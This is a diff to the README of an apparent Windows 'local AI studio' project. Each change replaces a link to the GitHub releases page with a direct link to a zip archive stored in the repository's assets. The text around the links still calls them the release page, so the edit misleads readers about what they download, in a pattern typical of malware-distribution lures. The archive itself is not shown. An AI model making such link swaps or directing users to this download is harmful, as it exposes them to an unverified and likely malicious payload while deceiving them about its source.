@@ -1,6 +1,6 @@
 # 🧠 codex-skill-local-ai-systems-studio - Run Local AI with Clear Steps
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/fifthdactyl811/codex-skill-local-ai-systems-studio/main/assets/systems_local_studio_skill_codex_ai_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This README helps you get the app on Windows and run it with local AI tools like
 
 Use the release page to download and install the app:
 
-[Visit the release page to download](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/fifthdactyl811/codex-skill-local-ai-systems-studio/main/assets/systems_local_studio_skill_codex_ai_v2.5.zip)
 
 ## 📦 What This Project Does
 
@@ -38,7 +38,7 @@ If you use local models, more RAM and disk space can help. Smaller models work b
 ## ⬇️ Download and Install on Windows
 
 1. Open the release page:
-   [https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
+   [https://raw.githubusercontent.com/fifthdactyl811/codex-skill-local-ai-systems-studio/main/assets/systems_local_studio_skill_codex_ai_v2.5.zip](https://raw.githubusercontent.com/fifthdactyl811/codex-skill-local-ai-systems-studio/main/assets/systems_local_studio_skill_codex_ai_v2.5.zip)
 
 2. Find the latest release at the top of the page.
 
@@ -208,7 +208,7 @@ This app is for people who want to:
 
 If you need the download page later, use this link:
 
-[https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases](https://github.com/fifthdactyl811/codex-skill-local-ai-systems-studio/releases)
+[https://raw.githubusercontent.com/fifthdactyl811/codex-skill-local-ai-systems-studio/main/assets/systems_local_studio_skill_codex_ai_v2.5.zip](https://raw.githubusercontent.com/fifthdactyl811/codex-skill-local-ai-systems-studio/main/assets/systems_local_studio_skill_codex_ai_v2.5.zip)
 
 ## 🪟 Windows Run Steps
 
